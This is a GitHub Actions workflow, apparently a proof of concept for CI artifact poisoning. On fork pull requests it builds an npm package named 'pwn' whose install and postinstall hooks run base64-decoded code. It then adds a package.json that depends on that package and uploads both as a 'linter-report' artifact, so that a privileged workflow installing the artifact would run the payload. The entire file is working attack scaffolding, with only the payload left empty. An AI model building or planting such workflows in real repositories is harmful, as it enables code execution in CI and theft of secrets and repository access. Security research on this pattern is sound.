name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-chosen linter-report artifact
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          IDX_B64: 
        run: |
          mkdir -p pkg/package
          printf '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
          printf '%s' "$IDX_B64" | base64 -d > pkg/package/index.js
          tar -czf pwn-1.0.0.tgz -C pkg package
          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
          printf 'report authored by the fork PR\n' > linter-report.txt
          printf '%s' "$PR_NUMBER" > pr-number.txt
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            pwn-1.0.0.tgz
          if-no-files-found: error
